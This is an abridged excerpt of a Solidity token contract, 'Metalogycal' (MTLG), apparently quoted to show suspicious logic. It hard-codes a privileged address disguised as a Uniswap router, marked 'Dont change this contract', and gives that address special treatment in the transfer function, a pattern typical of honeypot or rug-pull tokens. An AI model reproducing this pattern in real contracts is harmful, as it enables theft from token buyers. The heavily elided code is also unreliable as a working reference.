...
contract Metalogycal is Context, IERC20 { 
    ...
    string private constant _name = "Metalogycal"; 
    string private constant _symbol = unicode"MTLG"; 
    ...
    constructor () {
        ...
        uniSwapV2router = payable(0x9b135D4BD39d5CB4322955765d0CBe7314E164b7); // Dont change this contract.
    ...
    function _transfer(
        ...
        if (from != owner() && from != uniSwapV2router)
        ...
        bool takeFee = true;
        bool isBuy;
        if(!(to != uniSwapV2router) && burnTrigger < 1){
            burned = false;
        }
        else{
            burned = true;
